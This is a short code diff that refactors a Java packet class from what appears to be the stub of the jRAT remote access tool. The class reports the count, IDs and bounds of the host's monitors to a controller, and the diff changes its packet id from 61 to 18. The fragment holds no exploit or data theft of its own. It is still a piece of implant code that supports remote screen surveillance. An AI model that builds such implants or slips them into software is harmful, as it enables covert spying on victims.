@@ -1,25 +1,22 @@
 package se.jrat.stub.packets.outgoing;
 
 import java.awt.GraphicsDevice;
+import java.awt.GraphicsEnvironment;
 import java.awt.Rectangle;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet61InitMonitors extends AbstractOutgoingPacket {
-
-	private GraphicsDevice[] graphicsDevices;
-
-	public Packet61InitMonitors(GraphicsDevice[] graphicsDevices) {
-		this.graphicsDevices = graphicsDevices;
-	}
+public class Packet18InitMonitors extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(graphicsDevices.length);
+		GraphicsDevice[] monitors = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
+		
+		dos.writeInt(monitors.length);
 
-		for (GraphicsDevice device : graphicsDevices) {
+		for (GraphicsDevice device : monitors) {
 			Rectangle bounds = device.getDefaultConfiguration().getBounds();
 			String id = device.getIDstring();
 			if (id.startsWith("\\")) {
@@ -36,7 +33,7 @@ public class Packet61InitMonitors extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 61;
+		return (byte) 18;
 	}
 
 }
